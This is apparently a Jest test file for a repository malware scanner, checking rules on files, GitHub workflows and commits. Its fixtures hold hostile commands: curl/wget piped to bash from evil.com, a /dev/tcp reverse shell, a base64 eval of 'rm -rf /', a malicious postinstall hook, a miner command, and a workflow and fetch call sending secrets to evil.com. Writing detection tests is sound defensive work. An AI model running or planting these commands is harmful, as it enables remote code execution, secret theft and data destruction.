import { scanFileContent, scanWorkflowContent, scanCommit } from "../src/scanner";
import logger from "../src/utils/logger";
import type { Finding } from "../src/types";

const findRule = (findings: Finding[], ruleId: string): boolean =>
  findings.some((f) => f.rule === ruleId);

// ─── File scanner tests ───────────────────────────────────────────────────────

describe("scanFileContent", () => {
  it("detects curl|bash (remote code execution)", () => {
    const findings = scanFileContent("curl https://evil.com/payload.sh | bash", "setup.sh");
    expect(findRule(findings, "curl-pipe-bash")).toBe(true);
  });

  it("detects wget|sh", () => {
    const findings = scanFileContent("wget https://evil.com/x.sh | sh", "install.sh");
    expect(findRule(findings, "wget-pipe-shell")).toBe(true);
  });

  it("detects reverse shell", () => {
    const findings = scanFileContent("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "run.sh");
    expect(findRule(findings, "reverse-shell")).toBe(true);
  });

  it("detects base64 + eval obfuscation", () => {
    const encoded = Buffer.from("require('child_process').exec('rm -rf /')").toString("base64");
    const findings = scanFileContent(`eval(Buffer.from("${encoded}","base64").toString())`, "index.js");
    expect(findRule(findings, "obfuscated-base64")).toBe(true);
  });

  it("detects obfuscated string array malware", () => {
    const malware = `import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nglobal['!']='8-2728';var _$_1e42=(function(l,e){})(...);`;
    const findings = scanFileContent(malware, "tailwind.config.js");
    expect(findRule(findings, "obfuscated-malware-pattern")).toBe(true);
  });

  it("detects suspicious postinstall in package.json", () => {
    const content = JSON.stringify({
      scripts: { postinstall: "curl https://evil.com | sh" },
    });
    const findings = scanFileContent(content, "package.json");
    expect(findRule(findings, "suspicious-npm-postinstall")).toBe(true);
  });

  it("detects crypto miner keywords", () => {
    const findings = scanFileContent("xmrig --url stratum+tcp://pool.minero.cc", "miner.sh");
    expect(findRule(findings, "crypto-miner-keywords")).toBe(true);
  });

  it("returns correct severity for critical rules", () => {
    const findings = scanFileContent("curl https://evil.com | bash", "x.sh");
    const finding = findings.find((f) => f.rule === "curl-pipe-bash");
    expect(finding?.severity).toBe("critical");
  });

  it("passes clean source code", () => {
    const clean = `
      import express from 'express';
      const app = express();
      app.listen(3000);
    `;
    expect(scanFileContent(clean, "index.ts")).toHaveLength(0);
  });

  it("omits the filePath and returns null for the file field", () => {
    const findings = scanFileContent("curl https://evil.com/payload.sh | bash");
    expect(findings[0].file).toBeNull();
  });
});

// ─── Workflow scanner tests ───────────────────────────────────────────────────

describe("scanWorkflowContent", () => {
  it("detects workflow exfiltrating secrets via curl", () => {
    const yaml = `
      - name: Exfil
        run: curl https://evil.com/?t=$\{{ secrets.GITHUB_TOKEN }}
    `;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findRule(findings, "workflow-exfiltrate-secrets")).toBe(true);
  });

  it("detects workflow running curl|bash", () => {
    const yaml = `run: curl https://evil.com/payload.sh | bash`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/deploy.yml");
    expect(findRule(findings, "workflow-curl-pipe-bash")).toBe(true);
  });

  it("detects unpinned third-party action", () => {
    const yaml = `uses: some-org/some-action@main`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findRule(findings, "workflow-unpinned-action")).toBe(true);
  });

  it("passes pinned SHA action", () => {
    const yaml = `uses: some-org/some-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findRule(findings, "workflow-unpinned-action")).toBe(false);
  });

  it("passes first-party actions/* actions unpinned", () => {
    const yaml = `uses: actions/checkout@v4`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findRule(findings, "workflow-unpinned-action")).toBe(false);
  });

  it("detects unpinned third-party action in .yaml workflow file", () => {
    const yaml = `uses: some-org/some-action@main`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yaml");
    expect(findRule(findings, "workflow-unpinned-action")).toBe(true);
  });
});

// ─── env-exfiltration and hardcoded-secret tests ──────────────────────────────

describe("additional scanFileContent rules", () => {
  it("detects env-variable exfiltration pattern", () => {
    const content = [
      'const token = process.env.API_TOKEN;',
      'await fetch("https://evil.com/collect?token=" + token + "&secret=" + process.env.SECRET);',
    ].join("\n");
    const findings = scanFileContent(content, "src/utils.ts");
    expect(findRule(findings, "env-exfiltration")).toBe(true);
  });

  it("detects hardcoded API key", () => {
    const content = `const api_key = "sk-live-abcdefghijklmnop";`;
    const findings = scanFileContent(content, "config.ts");
    expect(findRule(findings, "hardcoded-secret")).toBe(true);
  });

  it("does not flag env access without network + secret keywords", () => {
    const content = `const port = process.env.PORT ?? 3000;`;
    const findings = scanFileContent(content, "server.ts");
    expect(findRule(findings, "env-exfiltration")).toBe(false);
  });
});

// ─── Workflow file dual-scan coverage ─────────────────────────────────────────
// Verifies that a workflow file containing both a generic (FILE_RULES) threat
// AND a workflow-specific (WORKFLOW_RULES) threat would be caught by each
// respective scanner — confirming the dual-scan path in scanCommit is necessary.

describe("workflow file dual-rule coverage", () => {
  it("workflow file: scanFileContent catches obfuscated-malware-pattern", () => {
    const content = [
      "name: CI",
      "on: [push]",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: node -e \"global['!']='8-2728';var _$_1e42=(function(l,e){})();\"",
    ].join("\n");
    const findings = scanFileContent(content, ".github/workflows/ci.yml");
    expect(findRule(findings, "obfuscated-malware-pattern")).toBe(true);
  });

  it("workflow file: scanWorkflowContent catches workflow-curl-pipe-bash", () => {
    const content = [
      "name: CI",
      "on: [push]",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: curl https://evil.com/payload.sh | bash",
    ].join("\n");
    const findings = scanWorkflowContent(content, ".github/workflows/ci.yml");
    expect(findRule(findings, "workflow-curl-pipe-bash")).toBe(true);
  });

  it("workflow file with both threats is caught by both scanners independently", () => {
    const content = [
      "name: CI",
      "on: [push]",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: curl https://evil.com/payload.sh | bash",
      "      - run: node -e \"global['!']='x';var _$_aa=(function(l,e){})();\"",
    ].join("\n");
    const fileFindings = scanFileContent(content, ".github/workflows/ci.yml");
    const workflowFindings = scanWorkflowContent(content, ".github/workflows/ci.yml");
    expect(findRule(fileFindings, "obfuscated-malware-pattern")).toBe(true);
    expect(findRule(workflowFindings, "workflow-curl-pipe-bash")).toBe(true);
  });
});

describe("scanCommit", () => {
  let mockOctokit: { request: jest.Mock };
  let requestMock: jest.Mock;

  beforeEach(() => {
    requestMock = jest.fn();
    mockOctokit = {
      request: requestMock,
    };
  });

  it("scans and detects findings in a regular file", async () => {
    requestMock.mockResolvedValue({
      data: {
        type: "file",
        content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
      },
    });

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: ["test.sh"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("curl-pipe-bash");
  });

  it("scans both file and workflow rules for workflow files", async () => {
    requestMock.mockResolvedValue({
      data: {
        type: "file",
        content: Buffer.from("uses: some-org/some-action@main").toString("base64"),
      },
    });

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: [".github/workflows/deploy.yml"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("workflow-unpinned-action");
  });

  it("skips binary files", async () => {
    // Binary files are now fetched to check for hidden JS malware signatures
    // but return no findings if the content is not JavaScript
    requestMock.mockResolvedValue({
      data: {
        type: "file",
        content: Buffer.from("PNG fake binary content").toString("base64"),
      },
    });

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: ["test.png"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(0);
    // Note: requestMock IS called now — binary files are fetched to check
    // for JS malware hidden inside binary-named files
    expect(requestMock).toHaveBeenCalledTimes(1);
  });

  it("skips non-file items (like directory arrays)", async () => {
    requestMock.mockResolvedValue({
      data: [{ name: "file1.txt", type: "file" }],
    });

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: ["dir"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(0);
  });

  it("logs a warning and returns no findings when fetching content throws an error", async () => {
    requestMock.mockRejectedValue(new Error("API rate limit exceeded"));

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: ["broken.js"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(0);
  });

  it("logs a warning with raw string when fetching content throws a non-Error object", async () => {
    requestMock.mockRejectedValue("Simulated raw string error");

    const findings = await scanCommit({
      octokit: mockOctokit as never,
      owner: "owner",
      repo: "repo",
      sha: "sha",
      addedFiles: ["broken.js"],
      modifiedFiles: [],
    });

    expect(findings).toHaveLength(0);
  });
});

describe("logger", () => {
  it("covers error formatting with error object containing stack trace", () => {
    const mockError = new Error("Test error for coverage");
    logger.error(mockError);
    expect(mockError.stack).toBeDefined();
  });
});
